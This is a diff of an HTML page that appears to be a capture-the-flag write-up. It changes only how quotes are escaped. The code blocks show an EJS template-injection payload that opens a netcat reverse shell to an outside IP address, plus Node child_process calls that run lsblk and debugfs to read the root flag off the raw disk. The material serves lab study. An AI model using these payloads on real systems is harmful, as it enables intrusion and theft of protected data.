@@ -71,7 +71,7 @@
 <p>This bypasses the password check and logs us into the application.</p>
 <p>The application contains an EJS field that processes server-side JavaScript. We can use it to execute commands and obtain a reverse shell.</p>
 <p>The attached payload is:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;%=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s1">&#39;rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2&gt;&amp;1 0&lt;/tmp/b | nc 192.168.188.174 4444 1&gt;/tmp/b&#39;</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;%=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s1">'rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2&gt;&amp;1 0&lt;/tmp/b | nc 192.168.188.174 4444 1&gt;/tmp/b'</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
 </code></pre></div>
 
 <p>After running the payload and receiving the shell, the user flag can be retrieved:</p>
@@ -92,7 +92,7 @@
 </code></pre></div>
 
 <p>Now use the Node.js process to execute the <code>lsblk</code> command:</p>
-<div class="highlight"><pre><span></span><code><span class="nx">process</span><span class="p">.</span><span class="nx">getBuiltinModule</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;lsblk&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
+<div class="highlight"><pre><span></span><code><span class="nx">process</span><span class="p">.</span><span class="nx">getBuiltinModule</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">'lsblk'</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
 </code></pre></div>
 
 <p>The output reveals the disk device:</p>
@@ -100,7 +100,7 @@
 <p><code>/dev/nvme0n1p1</code></p>
 </blockquote>
 <p>Since we have raw disk access, we can use <code>debugfs</code> to read the root flag directly from the filesystem:</p>
-<div class="highlight"><pre><span></span><code>process.getBuiltinModule<span class="o">(</span><span class="s1">&#39;child_process&#39;</span><span class="o">)</span>.execSync<span class="o">(</span><span class="s1">&#39;debugfs -R &quot;cat /root/root.txt&quot; /dev/nvme0n1p1&#39;</span><span class="o">)</span>.toString<span class="o">()</span>
+<div class="highlight"><pre><span></span><code>process.getBuiltinModule<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.execSync<span class="o">(</span><span class="s1">'debugfs -R "cat /root/root.txt" /dev/nvme0n1p1'</span><span class="o">)</span>.toString<span class="o">()</span>
 </code></pre></div>
 
 <p>This reveals the root flag:</p>
